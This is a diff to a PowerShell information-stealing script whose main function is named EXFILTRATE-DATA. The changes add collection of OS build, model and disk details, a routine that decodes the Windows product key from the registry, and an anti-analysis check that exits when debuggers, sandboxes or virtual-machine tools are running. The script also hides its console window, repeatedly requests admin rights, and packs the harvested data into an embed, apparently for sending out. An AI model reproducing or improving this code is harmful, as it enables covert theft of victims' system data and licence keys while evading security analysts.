@@ -11,12 +11,13 @@ function EXFILTRATE-DATA {
     $date = (get-date).toString("r")
     Get-ComputerInfo > $env:LOCALAPPDATA\Temp\system_info.txt
     $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
+    $osbuild = (Get-CimInstance Win32_OperatingSystem).Version 
+    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
+    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
     $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
     $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
     $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
     $cpu > $env:LOCALAPPDATA\Temp\cpu.txt
-    $fulldiskinfo = diskdata  | out-string 
-    $fulldiskinfo > $env:temp\DiskInfo.txt
     $gpu = (Get-WmiObject Win32_VideoController).Name 
     $gpu > $env:LOCALAPPDATA\Temp\GPU.txt
     $format = " GB"
@@ -104,6 +105,50 @@ function EXFILTRATE-DATA {
     $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
     $graphics.Dispose()
     $bmp.Dispose()
+	
+    function diskdata {
+    $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
+    $results = foreach ($disk in $disks) {
+        if ($disk.Size -gt 0) {
+            $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
+            $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
+    		$usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
+            [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
+            [PSCustomObject]@{
+                Drive = $disk.Name
+                Name = $disk.VolumeName
+                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
+                "Free Disk Size" = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
+                "Used Space" = "{0:N0} GB" -f $usedspace
+            }
+        }
+    }
+    $results | out-string 
+    }
+    $alldiskinfo = diskdata
+    $alldiskinfo > $env:temp\DiskInfo.txt
+
+    function Get-ProductKey {
+      $map="BCDFGHJKMPQRTVWXY2346789"
+      $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
+      $ProductKey = ""
+      for ($i = 24; $i -ge 0; $i--) {
+        $r = 0
+        for ($j = 14; $j -ge 0; $j--) {
+          $r = ($r * 256) -bxor $value[$j]
+          $value[$j] = [math]::Floor([double]($r / 24))
+          $r = $r % 24
+        }
+        $ProductKey = $map[$r] + $ProductKey
+    
+        if (($i % 5) -eq 0 -and $i -ne 0) {
+          $ProductKey = "-" + $ProductKey
+        }
+      }
+      $ProductKey
+    }
+    $ProductKey = Get-ProductKey
+    Get-ProductKey > $env:localappdata\temp\ProductKey.txt
     
     
     $embed_and_body = @{
@@ -141,11 +186,11 @@ function EXFILTRATE-DATA {
                     },
                     @{
                         "name" = ":computer: Hardware"
-                        "value" = "``````Screen Size: $screen `nOS: $osversion `nManufacturer: $mfg `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
+                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nDisplay Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                     },
                     @{
                         "name" = ":floppy_disk: Disk"
-                        "value" = "``````$fulldiskinfo``````"
+                        "value" = "``````$alldiskinfo``````"
                     }
                     @{
                         "name" = ":signal_strength: WiFi"
@@ -227,39 +272,7 @@ function Invoke-TASKS {
     EXFILTRATE-DATA
 }
 
-function diskdata {
-    $disks = get-wmiobject Win32_LogicalDisk -computername "$env:computername" -Filter "DriveType = 3"
-    foreach ($disk in $disks) {
-        $letter = $disk.deviceID
-        $volumename = $disk.volumename
-        $totalspace = [math]::round($disk.size / 1GB, 2)
-        $freespace = [math]::round($disk.freespace / 1GB, 2)
-        $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
-        $disk | Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} | FT 
-    }
-}
 
-function Get-ProductKey {
-  $map="BCDFGHJKMPQRTVWXY2346789"
-  $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
-  $ProductKey = ""
-  for ($i = 24; $i -ge 0; $i--) {
-    $r = 0
-    for ($j = 14; $j -ge 0; $j--) {
-      $r = ($r * 256) -bxor $value[$j]
-      $value[$j] = [math]::Floor([double]($r / 24))
-      $r = $r % 24
-    }
-    $ProductKey = $map[$r] + $ProductKey
-
-    if (($i % 5) -eq 0 -and $i -ne 0) {
-      $ProductKey = "-" + $ProductKey
-    }
-  }
-  $ProductKey
-}
-$ProductKey = Get-ProductKey
-Get-ProductKey > $env:localappdata\temp\ProductKey.txt
 
 function Request-Admin {
     while(!(CHECK_IF_ADMIN)) {
@@ -269,6 +282,60 @@ function Request-Admin {
         }
         catch {}
     }
+}
+
+function Invoke-ANTIVM {
+
+ function antivm
+ {
+   "autoruns"
+   "autorunsc"
+   "dumpcap"
+   "Fiddler"
+   "fakenet"
+   "HookExplorer"
+   "ImmunityDebugger"
+   "httpdebugger"
+   "ImportREC"
+   "LordPE"
+   "PETools"
+   "ProcessHacker"
+   "ResourceHacker"
+   "Scylla_x64"
+   "sandman"
+   "SysInspector"
+   "tcpview"
+   "die"
+   "dumpcap"
+   "filemon"
+   "idaq"
+   "idaq64"
+   "joeboxcontrol"
+   "joeboxserver"
+   "ollydbg"
+   "proc_analyzer"
+   "procexp"
+   "procmon"
+   "regmon"
+   "sniff_hit"
+   "sysAnalyzer"
+   "tcpview"
+   "windbg"
+   "Wireshark"
+   "x32dbg"
+   "x64dbg"
+   "Vmwareuser"
+   "Vmacthlp"
+   "vboxservice"
+   "vboxtray"
+ }
+$processnames = antivm
+if(($processnames | ForEach-Object {Get-Process -Name $_ -ea SilentlyContinue}) -eq $null){ 
+   Invoke-TASKS  
+}
+else{ 
+  exit
+}
 }
 
 function Hide-Console
@@ -288,7 +355,7 @@ function Hide-Console
 
 if (CHECK_IF_ADMIN -eq $true) {
     Hide-Console
-    Invoke-TASKS
+    Invoke-ANTIVM
     # Self-Destruct
 	# Remove-Item $PSCommandPath -Force 
 } else {
